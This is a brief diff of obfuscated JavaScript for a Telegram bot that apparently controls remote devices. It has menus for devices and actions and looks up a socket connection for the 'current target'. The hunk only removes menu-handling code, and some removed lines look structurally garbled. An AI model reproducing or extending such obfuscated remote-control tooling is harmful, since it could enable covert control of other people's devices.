@@ -330,24 +330,7 @@ bot.on("message", _0xdbde0c => {
                                                         'resize_keyboard': true,
                                                         'one_time_keyboard': true
                                                     }
-                                                });
-                                            }
-                                        } else {
-                                            bot.sendMessage(data.id, "\n з \n", {
-                                            'parse_mode': 'HTML'
-                                                 });
-                                                    } else if (_0xdbde0c.text === "✯ 𝙱𝚊𝚔𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯") {
 
-                                                    bot.sendMessage(data.id, "<b>✯ 𝙼𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n", {
-                                                        'parse_mode': "HTML",
-                                                        'reply_markup': {
-                                                            'keyboard': [
-                                                                ["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"],
-                                                                ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"]
-                                                            ],
-                                                            'resize_keyboard': true
-                                                        }
-                                                    });
                                                 } else {
                                                     if (_0xdbde0c.text === "✯ 𝙲𝚊𝚗𝚌𝚎𝚕 𝚊𝚌𝚝𝚒𝚘𝚗 ✯") {
                                                         let _0x3202e5 = io.sockets.sockets.get(appData.get("currentTarget")).model;
